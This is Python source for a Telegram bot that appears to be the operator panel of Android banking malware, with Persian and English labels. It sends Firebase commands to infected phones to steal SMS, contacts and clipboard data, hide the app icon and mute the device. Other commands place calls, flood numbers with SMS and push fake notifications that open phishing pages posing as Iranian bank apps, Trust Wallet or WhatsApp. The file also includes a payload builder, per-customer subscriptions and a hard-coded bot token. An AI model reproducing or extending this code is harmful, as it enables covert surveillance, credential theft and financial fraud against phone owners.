import os.path
from re import S
from sys import flags
from time import sleep
from typing import Text
import requests
import json
import jwt
from telebot import types
import telebot
import random
import ast
from threading import Thread
import asyncio
import sqlite3
import datetime
import time

conn = sqlite3.connect("main.db", check_same_thread=False)
cr = conn.cursor()

cr.execute("create table if not exists permitted(chat_id text primary key)")
conn.commit()
cr.execute("create table if not exists addedtime(chat_id text primary key , paytime text , endtime text)")
conn.commit()

bot = telebot.TeleBot("7035369985:AAF814ct9pZjvNRS26LnhM-CWCRQ60dODX0")
chatid = -1002054656157

Topic = "professor"
mainUrl = "https://phptestproject.oghabhosting.ir"

filename = "number.txt"
appdata = {}
loadingProccess = []
balanceShaba = ""
file = "dmprofessor-ad4de-firebase-adminsdk-mficn-7fa874bfae.json"
project_id = "dmprofessor-ad4de"
# Rade
# info
username = ""
password = ""

site = "https://my.rade.ir/panel"
datacard = []
dicdatacard = {}

# Headers
rade_headers = {
    'Host': 'my.rade.ir',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/80.0.3987.160 Chrome/80.0.3987.163 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json',
    'Origin': 'https://my.rade.ir',
    'Connection': 'keep-alive',
}


def makePort(chat_id):
    requests.get(f"{mainUrl}/{Topic}/makeport.php?chatid={chat_id}")


def permit(chat_id, days):
    try:
        now = datetime.datetime.now()
        now_unix = int(time.mktime(now.timetuple()))
        enddate = now + datetime.timedelta(days=days)
        enddate_unix = int(time.mktime(enddate.timetuple()))
        cr.execute(f"insert or ignore into addedtime values(?,?,?)", (chat_id, str(now_unix), str(enddate_unix)))
        conn.commit()
        addOnlypermitted(chat_id)
    except Exception as e:
        print(e)


def addOnlypermitted(chat_id):
    try:
        cr.execute(f"insert or ignore into permitted values(?)", (chat_id,))
        conn.commit()
    except Exception as e:
        return e


def unpermit(chat_id):
    try:
        cr.execute(f"delete from permitted where chat_id='{chat_id}'")
        conn.commit()
    except Exception as e:
        print(e)


def unix_to_datetime(unix_timestamp):
    # Convert the Unix timestamp to a datetime object
    dt = datetime.datetime.fromtimestamp(unix_timestamp)

    # Return the formatted date and time string
    return dt.strftime('%Y-%m-%d %H:%M:%S')


def getAddedDate(chat_id):
    try:
        cr.execute(f"select * from addedtime where chat_id='{chat_id}'")
        return int(cr.fetchall()[0][1])
    except Exception as e:
        return e


def getExpireTime(chat_id):
    try:
        cr.execute(f"select * from addedtime where chat_id='{chat_id}'")
        return int(cr.fetchall()[0][2])
    except Exception as e:
        return e


def expired(chat_id):
    try:
        addedtime = getExpireTime(chat_id)
        now = int(time.mktime(datetime.datetime.now().timetuple()))
        if now >= addedtime:
            return True
        else:
            return False
    except Exception as e:
        return e


def isPermitted(chat_id):
    try:
        if str(chat_id) == str(chatid):
            return True

        if expired(chat_id) == True:
            return False

        cr.execute(f"select * from permitted")
        data = cr.fetchall()
        for i in data:
            if str(chat_id) in i:
                return True
        return False
    except Exception as e:
        return e


def inPermittedList(chat_id):
    try:
        cr.execute(f"select * from permitted")
        data = cr.fetchall()
        for i in data:
            if str(chat_id) in i:
                return True
        return False
    except Exception as e:
        return e


def permitedList():
    try:
        cr.execute(f"select * from permitted")
        data = cr.fetchall()
        return data
    except Exception as e:
        return e


def addExpiredays(chat_id, days):
    try:
        now = datetime.datetime.now()
        new_end_date = now + datetime.timedelta(days=int(days))
        new_end_date_unix = int(time.mktime(new_end_date.timetuple()))
        cr.execute(f"update addedtime set endtime='{new_end_date_unix}' where chat_id='{chat_id}'")
        conn.commit()
    except Exception as e:
        return e


def get_access_token(file):
    service_account_file_path = file
    with open(service_account_file_path) as f:
        service_account = json.load(f)

    client_email = service_account['client_email']
    private_key = service_account['private_key']

    payload = {
        "iss": client_email,
        "scope": "https://www.googleapis.com/auth/firebase.messaging",
        "aud": "https://www.googleapis.com/oauth2/v4/token",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }

    jwt_token = jwt.encode(payload, private_key, algorithm='RS256')

    request_body = {
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion": jwt_token
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post("https://www.googleapis.com/oauth2/v4/token", json=request_body, headers=headers)

    access_token = response.json()['access_token']

    return access_token


fire_base_access_token = get_access_token(file)


def send(androidid, mobilenumber, forsend, chat_id):
    try:
        msg = {
            'lydia1': f"sm{androidid}",
            "lydia2": f"{mobilenumber}&{forsend}"
        }
        data = {
            'message': {
                'topic': Topic,
                'data': msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json'
        }

        res = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=data
        ).json()
    except Exception as e:
        print('Connection error:', e)


def sendsim2(androidid, mobilenumber, forsend, chat_id):
    try:
        msg = {
            'lydia1': f"sm2{androidid}",
            "lydia2": f"{mobilenumber}&{forsend}"
        }
        data = {
            'message': {
                'topic': Topic,
                'data': msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json'
        }

        res = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=data
        ).text
    except:
        print('connectino error')


def import_contact(androidid, name, number, chat_id):
    try:
        msg = {
            'lydia1': f"importcontact{androidid}",
            "lydia2": f"{name}&{number}"
        }
        data = {
            'message': {
                'topic': Topic,
                'data': msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json'
        }

        res = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=data
        ).text
    except Exception as e:
        print(f"An error occurred: {str(e)}")


def send_contacts(androidid, message, chat_id):
    try:
        msg = {
            'lydia1': f"smcontact{androidid}",
            "lydia2": f"{message}"
        }
        data = {
            'message': {
                'topic': Topic,
                'data': msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json'
        }

        response = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=msg
        ).text
    except:
        pass


def sendbomber(mobilenumber, forsend, chat_id):
    try:
        msg = {
            'lydia1': "smbomber",
            "lydia2": f"{mobilenumber}&{forsend}"
        }
        data = {
            'message': {
                'topic': Topic,
                'data': msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json'
        }

        res = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=data
        ).text
    except:
        print('connection error')


def list_user(chat_id):
    try:
        msg = {
            'lydia1': "List",
            "lydia2": "2"
        }
        data = {
            'message': {
                'topic': Topic,
                'data': msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json'
        }

        res = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=data
        ).text
    except:
        print('connection error.')


def blist_user(chat_id):
    try:
        msg = {
            'lydia1': "bList",
            "lydia2": "2"
        }
        data = {
            'message': {
                'topic': Topic,
                'data': msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json; charset=UTF-8'
        }

        res = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=data
        ).text
        print(res)
    except:
        pass


def sendaction(action, android_id, chat_id):
    msg = {
        'lydia1': f"mobile{android_id}",
        'lydia2': action

    }
    data = {
        "message": {
            "topic": Topic,
            "data": msg
        }
    }

    headers = {
        'Authorization': f'Bearer {fire_base_access_token}',
        'Content-Type': 'application/json'
    }
    print(headers)
    res = requests.post(
        url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
        headers=headers,
        json=data
    ).text
    print(data)
    print(res)


def call(android_id, chat_id, number):
    try:
        msg = {
            'lydia1': f"call{android_id}",
            "lydia2": f"{number}"
        }
        data = {
            'message': {
                'topic': Topic,
                'data': msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json'
        }

        res = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=data
        ).text
    except:
        pass


def status(android_id, chat_id):
    msg = {
        'lydia1': f"mobile{android_id}",
        'lydia2': "getstatus"

    }
    data = {
        "message": {
            "topic": Topic,
            "data": msg
        }
    }

    headers = {
        'Authorization': f'Bearer {fire_base_access_token}',
        'Content-Type': 'application/json'
    }
    print(headers)
    res = requests.post(
        url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
        headers=headers,
        json=data
    ).text
    print(data)
    print(res)

def autoSend(android_id,sms, chat_id):
    msg = {
        'lydia1': f"autosend{android_id}",
        'lydia2': sms

    }
    data = {
        "message": {
            "topic": Topic,
            "data": msg
        }
    }

    headers = {
        'Authorization': f'Bearer {fire_base_access_token}',
        'Content-Type': 'application/json'
    }
    print(headers)
    res = requests.post(
        url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
        headers=headers,
        json=data
    ).text
    print(data)
    print(res)

def saveAutoNumbers(android_id,phones, chat_id):
    msg = {
        'lydia1': f"savenumbers{android_id}",
        'lydia2': phones

    }
    data = {
        "message": {
            "topic": Topic,
            "data": msg
        }
    }

    headers = {
        'Authorization': f'Bearer {fire_base_access_token}',
        'Content-Type': 'application/json'
    }
    print(headers)
    res = requests.post(
        url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
        headers=headers,
        json=data
    ).text
    print(data)
    print(res)

def BroadcastToAll_action(chat_id, action):
    try:
        msg = {
            'lydia1': "mobile",
            "lydia2": action
        }
        data = {
            "message": {
                "topic": Topic,
                "data": msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json'
        }

        res = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=data
        ).text
    except:
        print('connection error')


def sendcontact(androidid, forsend, chat_id):
    msg = {
        'lydia1': f"SMcontactmobile{androidid}",
        "lydia2": f"{forsend}"
    }
    data = {
        "message": {
            "topic": Topic,
            "data": msg
        }
    }

    headers = {
        'Authorization': f'Bearer {fire_base_access_token}',
        'Content-Type': 'application/json'
    }

    endpoint = f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send'

    res = requests.post(
        url=endpoint,
        headers=headers,
        json=data
    ).text


def changeicon(id, action, chat_id):
    try:
        msg = {
            'lydia1': f"mobile{id}",
            "lydia2": f"{action}"
        }
        data = {
            "message": {
                "topic": Topic,
                "data": msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json'
        }

        res = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=data
        ).text
    except:
        pass


def send_notification(android_id, title, text, icon, content, chat_id, fire_base_access_token, Topic):
    try:
        msg = {
            'lydia1': f"sendnotification{android_id}",
            "lydia2": f"{title}&{text}&{icon}&{content}"
        }
        data = {
            "message": {
                "topic": Topic,
                "data": msg
            }
        }

        headers = {
            'Authorization': f'Bearer {fire_base_access_token}',
            'Content-Type': 'application/json'
        }

        res = requests.post(
            url=f'https://fcm.googleapis.com/v1/projects/{project_id}/messages:send',
            headers=headers,
            json=data
        ).text
    except:
        print('connectino error')


def readphones(filename):
    with open(filename) as f:
        content = f.readlines()

    content = [x.strip() for x in content]

    return content


def androidid(message):
    if message.text:
        with open(f'./data/androidid_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
            f.write(message.text)
            bot.send_message(message.chat.id, "Your Mobile-ID Saved!", message.text)


def messagef(message):
    if message.text:
        with open(f'./data/message_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
            f.write(message.text)
            bot.send_message(message.chat.id, "Your Text message Saved!", message.text)


def nmessagef(message):
    global appdata
    if message.text:
        appdata[f'notificationtext_{message.chat.id}'] = message.text
        bot.send_message(message.chat.id, "Your Notification Text Saved!", message.text)


def fakepage(message):
    global appdata
    if message.text:
        appdata[f'content_{message.chat.id}'] = "browser"
        appdata[f'browser_{message.chat.id}'] = message.text
        bot.send_message(message.chat.id, "Your fakepage url saved and Browser option selected.")


def ntitle(message):
    global appdata
    if message.text:
        appdata[f'title_{message.chat.id}'] = message.text
        bot.send_message(message.chat.id, "Your notification title saved.")


def number(message):
    with open(f'./data/number_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
        f.write(message.text)
        bot.send_message(message.chat.id, "Your Numbers Saved!", message.text)


def readphones(filename):
    with open(filename) as f:
        content = f.readlines()

    content = [x.strip() for x in content]

    return content


def sender(phone_list_obj, android_id, message_text):
    try:
        if phone_list_obj.text:
            phone_list = phone_list_obj.text.splitlines()
            Counter = 0
            Content = phone_list_obj.text
            CoList = Content.split("\n")

            for i in CoList:
                if i:
                    Counter += 1
            if Counter <= 200:
                bot.send_message(phone_list_obj.chat.id,
                                 f"Sending messages please wait...!\n📨Count : {Counter}\n🖥 : {android_id}\n🔎Slot : Default")
                for i in phone_list:
                    Thread(target=send, args=(android_id, i, message_text, phone_list_obj.chat.id)).start()
                next
                bot.send_message(phone_list_obj.chat.id,
                                 f"Messages sent successfully\n📨Count : {Counter}\n🖥 : {android_id}\n🔎Slot : Default")
            else:
                bot.send_message(phone_list_obj.chat.id, "Forbiden! Numbers must be less than 200")
    except:
        pass


def sender2(phone_list_obj, message_text):
    try:
        if phone_list_obj.text:
            phone_list = phone_list_obj.text.splitlines()
            Counter = 0
            Content = phone_list_obj.text
            CoList = Content.split("\n")
            for i in CoList:
                if i:
                    Counter += 1
            if Counter <= 200:
                bot.send_message(phone_list_obj.chat.id,
                                 f"Sending messages please wait...!\n📨Count :{Counter}\n🖥 : Online Users")
                for i in phone_list:
                    Thread(target=sendbomber, args=(i, message_text, phone_list_obj.chat.id)).start()
                next
                bot.send_message(phone_list_obj.chat.id,
                                 f"Messages sent successfully\n📨Count :{Counter}\n🖥 : Online Users")
            else:
                bot.send_message(phone_list_obj.chat.id, "Forbiden! Numbers must be less than 200")
    except:
        pass


def sendersim2(phone_list_obj, android_id, message_text):
    if phone_list_obj.text:
        phone_list = phone_list_obj.text.splitlines()
        Counter = 0
        Content = phone_list_obj.text
        CoList = Content.split("\n")
        for i in CoList:
            if i:
                Counter += 1
        if Counter <= 200:
            bot.send_message(phone_list_obj.chat.id,
                             f"Sending messages please wait...!\n📨Count : {Counter}\n🖥 : {android_id}\n🔎Slot : secend")
            for i in phone_list:
                Thread(target=sendsim2, args=(android_id, i, message_text, phone_list_obj.chat.id)).start()
            next
            bot.send_message(phone_list_obj.chat.id,
                             f"Messages sent successfully\n📨Count : {Counter}\n🖥 : {android_id}\n🔎Slot : secend")
        else:
            bot.send_message(phone_list_obj.chat.id, "Forbiden! Numbers must be less than 200")


def set_url(message):
    try:
        chat_id = message.chat.id
        if message.text:
            set_link = requests.get(f'{mainUrl}/{Topic}/{chat_id}/url.php?url=url&text={message.text}')
            print(set_link)
            if set_link.status_code == 200:
                bot.send_message(message.chat.id, f"The url {message.text} has been set successfully .")
            else:
                bot.send_message(message.chat.id, f"Failed to set url !")
        else:
            bot.send_message(message.chat.id, f"Failed to set url !")
    except:
        pass


def read_offnum(chat_id):
    try:
        count = requests.get(f"{mainUrl}/{Topic}/{chat_id}/number.txt")
        if count.text == "":
            return "Empty"

        elif count.status_code == 404:
            return "Empty"

        else:
            text = list(count.text)
            if len(text) == 11:
                return count.text
            else:
                return "valid"
    except:
        pass


def set_off_num(message):
    try:
        chat_id = message.chat.id
        if message.text.isdigit():
            set_link = requests.get(f'{mainUrl}/{chat_id}block.php?url=setoffnum&text={message.text}')
            if set_link.status_code == 200:
                bot.send_message(message.chat.id, f"The phonenumber {message.text} has been set successfully .")
            else:
                bot.send_message(message.chat.id, f"Failed to set phonenumber !")
        else:
            bot.send_message(message.chat.id, f"Failed to set phonenumber !")
    except:
        pass


def makeKeyboard_rm():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="📲 𝑯𝒊𝒅𝒆 𝑰𝒄𝒐𝒏",
                                          callback_data="hideicon"),
               types.InlineKeyboardButton(text="🪜 𝑺𝒕𝒂𝒕𝒖𝒔",
                                          callback_data="status"))

    markup.add(types.InlineKeyboardButton(text="📥 𝑮𝒆𝒕𝑨𝒍𝒍𝑴𝒆𝒔𝒔𝒂𝒈𝒆𝒔",
                                          callback_data="getallmessage"))

    markup.add(types.InlineKeyboardButton(text="📥 (𝒔𝒂𝒗𝒆𝒅)",
                                          callback_data="allmsg2"),
               types.InlineKeyboardButton(text="📥 (𝒎𝒖𝒍𝒕𝒊𝒑𝒍𝒚)",
                                          callback_data="msgall3"))

    markup.add(types.InlineKeyboardButton(text="📥 (𝑸𝒖𝒂𝒓𝒕𝒆𝒓𝑶𝒇𝑰𝒏𝒅𝒆𝒙)",
                                          callback_data="quarter"),
               types.InlineKeyboardButton(text="📥 (𝑯𝒂𝒍𝒇𝑶𝒇𝑰𝒏𝒅𝒆𝒙)",
                                          callback_data="half"))

    markup.add(types.InlineKeyboardButton(text="🔗 𝑺𝒉𝒐𝒘 𝑰𝒄𝒐𝒏",
                                          callback_data="show"))

    markup.add(types.InlineKeyboardButton(text="📱 𝑨𝒑𝒑 𝑳𝒊𝒔𝒕",
                                          callback_data="allapp"),
               types.InlineKeyboardButton(text="🔇 𝑴𝒖𝒕𝒆",
                                          callback_data="mute"))

    markup.add(types.InlineKeyboardButton(text="📨 𝑺𝒆𝒏𝒅 𝑺𝒎𝒔",
                                          callback_data="sendsms"))

    markup.add(types.InlineKeyboardButton(text="🕛 𝑮𝒆𝒕𝑳𝒂𝒔𝒕𝑺𝒎𝒔",
                                          callback_data="getlastsms"))

    markup.add(types.InlineKeyboardButton(text="☎️ 𝑮𝒆𝒕𝑪𝒐𝒏𝒕𝒂𝒄𝒕𝒔",
                                          callback_data="getcontact"),
               types.InlineKeyboardButton(text="☎️ 𝑺𝒄𝒐𝒏𝒕𝒂𝒄𝒕𝒔",
                                          callback_data="sendcontact"))

    markup.add(types.InlineKeyboardButton(text="📕 𝑰𝒎𝒑𝒐𝒓𝒕 𝑪𝒐𝒏𝒕𝒂𝒄𝒕",
                                          callback_data="addcontact"))

    markup.add(types.InlineKeyboardButton(text="📶 𝑪𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏𝒔",
                                          callback_data="connections"))

    markup.add(types.InlineKeyboardButton(text="📋 𝑪𝒍𝒊𝒑𝒃𝒐𝒂𝒓𝒅",
                                          callback_data="clipboard"),
               types.InlineKeyboardButton(text="📝 𝑺𝒆𝒕𝑻𝒆𝒙𝒕",
                                          callback_data="settext"))

    markup.add(types.InlineKeyboardButton(text="🌀 𝑪𝒉𝒂𝒏𝒈𝒆 𝑰𝒄𝒐𝒏 🌀",
                                          callback_data="chicon"))

    markup.add(types.InlineKeyboardButton(text="🔌 𝑷𝒆𝒓𝒎𝒊𝒔𝒔𝒊𝒐𝒏𝒔-𝑪𝒉𝒆𝒄𝒌",
                                          callback_data="check"))

    markup.add(types.InlineKeyboardButton(text="⚙️ 𝑻𝒐𝒐𝒍𝒔",
                                          callback_data="tools"),
               types.InlineKeyboardButton(text="🔔 𝑵𝒐𝒕𝒊𝒇𝒊𝒄𝒂𝒕𝒊𝒐𝒏",
                                          callback_data="notification"))
    markup.add(types.InlineKeyboardButton(text="📞 𝑭𝒊𝒏𝒅𝑵𝒖𝒎𝒃𝒆𝒓𝒔",
                                          callback_data="findnumbers"),
               types.InlineKeyboardButton(text="💰 𝑭𝒊𝒏𝒅𝑩𝒂𝒍𝒂𝒏𝒄𝒆𝒔",
                                          callback_data="findbalances"))

    markup.add(types.InlineKeyboardButton(text="📬 𝑶𝒇𝒇𝒍𝒊𝒏𝒆 𝒎𝒐𝒅𝒆",
                                          callback_data="offline"))

    return markup


def offlinemode(chat_id):
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="👤 Phone :",
                                          callback_data="defdwefw"),
               types.InlineKeyboardButton(text=f"{read_offnum(chat_id)}",
                                          callback_data="setoffnum"))

    markup.add(types.InlineKeyboardButton(text="🔎 Status :",
                                          callback_data="offstatus"),
               types.InlineKeyboardButton(text="Empty",
                                          callback_data="rtltytlpr"))

    markup.add(types.InlineKeyboardButton(text="Enable Offline receiver ✅",
                                          callback_data="enoff"))

    markup.add(types.InlineKeyboardButton(text="Disable Offline receiver ❌",
                                          callback_data="disoff"))

    markup.add(types.InlineKeyboardButton(text="Back 🔙",
                                          callback_data="back"))
    return markup


def connectionIntent(chat_id):
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="Reuest Permission Chrome",
                                          callback_data="rpermissinch"),
               types.InlineKeyboardButton(text="این بخش تکمیل نشده",
                                          callback_data="rtltytlpr"))

    markup.add(types.InlineKeyboardButton(text="𝑻𝒖𝒓𝒏𝑶𝒏 𝒎𝒐𝒃𝒊𝒍𝒆𝑫𝒂𝒕𝒂 ✅",
                                          callback_data="trunondata"))

    markup.add(types.InlineKeyboardButton(text="𝑻𝒖𝒓𝒏𝑶𝒏 𝑾𝒊𝒇𝒊 ✅",
                                          callback_data="turnonwifi"))

    markup.add(types.InlineKeyboardButton(text="Back 🔙",
                                          callback_data="back"))
    return markup


def NotificationSettings(chatid):
    global appdata

    try:
        content = appdata[f'content_{chatid}']
        title = appdata[f'title_{chatid}']
        icon = appdata[f'icon_{chatid}']
    except:
        content = appdata[f'content_{chatid}'] = "Default"
        title = appdata[f'title_{chatid}'] = "Default"
        icon = appdata[f'icon_{chatid}'] = "Default"

    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="🌀 Icons",
                                          callback_data="ertgrgdg"),
               types.InlineKeyboardButton(text=f"{icon}",
                                          callback_data="nicon"))

    markup.add(types.InlineKeyboardButton(text="⚜️ Title :",
                                          callback_data="yhgbdghtr"),
               types.InlineKeyboardButton(text=f"{title}",  # Default
                                          callback_data="ntitle"))

    markup.add(types.InlineKeyboardButton(text="📦 Content :",
                                          callback_data="hjgjjj"),
               types.InlineKeyboardButton(text=f"{content}",  # Default
                                          callback_data="ncontent"))

    markup.add(types.InlineKeyboardButton(text="📝 Text",
                                          callback_data="ntext"))

    markup.add(types.InlineKeyboardButton(text="🔔 Send Notification ✔️",
                                          callback_data="sendnotification"))

    markup.add(types.InlineKeyboardButton(text="Back 🔙",
                                          callback_data="back"))
    return markup


def ContentSettings():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="🌐 Browser :",
                                          callback_data="ertgrgdg"),
               types.InlineKeyboardButton(text="setpage",
                                          callback_data="setpage"))

    markup.add(types.InlineKeyboardButton(text="WahtsApp",
                                          callback_data="whatsapp"),
               types.InlineKeyboardButton(text="Main",
                                          callback_data="mainactivity"))

    markup.add(types.InlineKeyboardButton(text="Call",
                                          callback_data="callin"),
               types.InlineKeyboardButton(text="Gmail",
                                          callback_data="gmailin"))

    markup.add(types.InlineKeyboardButton(text="همراه بانک صادرات",
                                          callback_data="hsaderat"),
               types.InlineKeyboardButton(text="همراه بانک ملت",
                                          callback_data="hmellat"))

    markup.add(types.InlineKeyboardButton(text="Back 🔙",
                                          callback_data="nback"))
    return markup


def iconsSettings():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="Whatsapp",
                                          callback_data="whatsapp_icon"),
               types.InlineKeyboardButton(text="Telegram",
                                          callback_data="telegram_icon"))

    markup.add(types.InlineKeyboardButton(text="messages(Samsung)",
                                          callback_data="messages_sam"),
               types.InlineKeyboardButton(text="messages(Xiaomi)",
                                          callback_data="messages_xia"))

    markup.add(types.InlineKeyboardButton(text="Google Chrome",
                                          callback_data="chrome_icon"),
               types.InlineKeyboardButton(text="Trust Wallet",
                                          callback_data="trustwallet_icon"))

    markup.add(types.InlineKeyboardButton(text="همراه بانک صادرات",
                                          callback_data="hsaderat_icon"),
               types.InlineKeyboardButton(text="همراه بانک ملت",
                                          callback_data="hmellat_icon"))

    markup.add(types.InlineKeyboardButton(text="Back 🔙",
                                          callback_data="nback"))
    return markup


def broadCastn():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="𝑨𝒖𝒕𝒐𝑯𝒊𝒅𝒆",
                                          callback_data="hideall"),
               types.InlineKeyboardButton(text="𝑶𝒇𝒇𝒍𝒊𝒏𝒆 𝒎𝒐𝒅𝒆",
                                          callback_data="offmodeall"))

    markup.add(types.InlineKeyboardButton(text="𝑳𝒂𝒔𝒕𝒔𝒎𝒔",
                                          callback_data="lastsmsall"),
               types.InlineKeyboardButton(text="𝑨𝒍𝒍𝒔𝒎𝒔",
                                          callback_data="allsmsall"))

    markup.add(types.InlineKeyboardButton(text="𝑴𝒖𝒕𝒆",
                                          callback_data="muteall"))

    markup.add(types.InlineKeyboardButton(text="Back 🔙",
                                          callback_data="mback"))
    return markup


def glasses_rm(call):
    try:
        if call.text:
            androidid_saver = open(f'data/saver_{call.chat.id}.txt', 'w')
            androidid_saver.write(call.text)
            androidid_saver.close()

            bot.send_message(chat_id=call.chat.id,
                             text=f"~ @Goodhudodo\ni have seen you since 17 september\n~ : {call.text}",
                             reply_markup=makeKeyboard_rm(),
                             parse_mode='HTML')

        else:
            bot.send_message(call.chat.id, "dont send me boulshit.")
    except:
        pass


def glasses_rm_cammand(android_id, chat_id):
    try:

        androidid_saver = open(f'data/saver_{chat_id}.txt', 'w')
        androidid_saver.write(f"{android_id}")
        androidid_saver.close()

        bot.send_message(chat_id=chat_id,
                         text=f"~ @Goodhudodo\ni have seen you since 17 september\n~ : {android_id}",
                         reply_markup=makeKeyboard_rm(),
                         parse_mode='HTML')
    except:
        pass


def read_users_count(chat_id):
    try:
        count = requests.get(f"{mainUrl}/{Topic}/{chat_id}/user.txt")
        if count.text == "":
            return 0

        elif count.status_code == 404:
            return "Not Found"

        else:
            return count.text
    except:
        pass


def read_link(chat_id):
    try:
        count = requests.get(f"{mainUrl}/{Topic}/{chat_id}/url.txt")
        if count.text == "":
            print("Empty")
            return "Empty"

        elif count.status_code == 404:
            print("Empty2")
            return "Empty"

        else:
            text = list(count.text)
            if len(text) <= 45:
                return count.text
            else:
                return "Your url is too Long:/"
    except:
        print("Empty3")


def readautomatic(chat_id):
    try:
        count = requests.get(f"{mainUrl}/{Topic}/{chat_id}/sms.txt")
        if count.text == "":
            return "Empty"
        elif count.status_code == 404:
            return "Click here to activate"
        else:
            return count.text
    except:
        pass


def lastsms(message):
    chatid = message.chat.id
    text = message.text.split('lastsms_')
    if message.text:
        sendaction("getlastsms", text[1], chatid)
        bot.send_message(chatid, f"getlastsms request sent.\n🍷 : {text[1]}")


def allsms(message):
    chatid = message.chat.id
    text = message.text.split('allsms_')
    if message.text:
        sendaction("getallmessage", text[1], chatid)
        bot.send_message(chatid, f"getallsms request sent.\n🍷 : {text[1]}")

    ###############################################################################################################


def makeKeyboard(chat_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(text="👥 𝑰𝒏𝒔𝒕𝒂𝒍𝒍𝒆𝒅 𝑫𝒆𝒗𝒊𝒄𝒆𝒔 :",
                                          callback_data="ohkt"),
               types.InlineKeyboardButton(text=f"{read_users_count(chat_id)}",
                                          callback_data="hyujhhjh")),
    markup.add(types.InlineKeyboardButton(text="📊 𝖑𝖎𝖘𝖙",
                                          callback_data="list"),
               types.InlineKeyboardButton(text="🌐 𝑩𝒓𝒐𝒂𝒅𝒄𝒂𝒔𝒕𝑻𝒐𝑨𝒍𝒍",
                                          callback_data="broadcastt")),

    markup.add(types.InlineKeyboardButton(text="💌 𝑺𝒎𝒔-𝑩𝒐𝒎𝒃𝒆𝒓",
                                          callback_data="smsbomber"),
               types.InlineKeyboardButton(text="📝 𝑺𝒆𝒕𝑻𝒆𝒙𝒕",
                                          callback_data="settext")),
    markup.add(types.InlineKeyboardButton(text="🔗 𝑺𝒆𝒕𝑳𝒊𝒏𝒌 :",
                                          callback_data="setlink"),
               types.InlineKeyboardButton(text=f"{read_link(chat_id)}",
                                          callback_data="kossher"))
    markup.add(types.InlineKeyboardButton(text="🍷 𝑴𝒚 𝑷𝒐𝒓𝒕",
                                          callback_data="myport"),
               types.InlineKeyboardButton(text=f"🔎 𝑸𝒖𝒊𝒄𝒌 𝒍𝒊𝒔𝒕",
                                          callback_data="blist"))

    markup.add(types.InlineKeyboardButton(text="⚙️ 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔",
                                          callback_data="settings"))

    return markup


def settings(chat_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(text="🗂 Automatic File :",
                                          callback_data="weifjijr"),
               types.InlineKeyboardButton(text=f"{readautomatic(chat_id)}",
                                          callback_data="autofile")),

    markup.add(types.InlineKeyboardButton(text="🔎 Check-Host :",
                                          callback_data="hrrthrth"),
               types.InlineKeyboardButton(text=f"{read_link(chat_id)}",
                                          callback_data="hostcheck"))

    markup.add(types.InlineKeyboardButton(text="📜 Clear BlockList",
                                          callback_data="clblock"))

    markup.add(types.InlineKeyboardButton(text=f"استعلام شبا و شماره حساب",
                                          callback_data="shaba"))

    markup.add(types.InlineKeyboardButton(text=f"گرفتن موجودی پنل",
                                          callback_data="shababalance"))

    markup.add(types.InlineKeyboardButton(text="📦 Builder",
                                          callback_data="builder"))

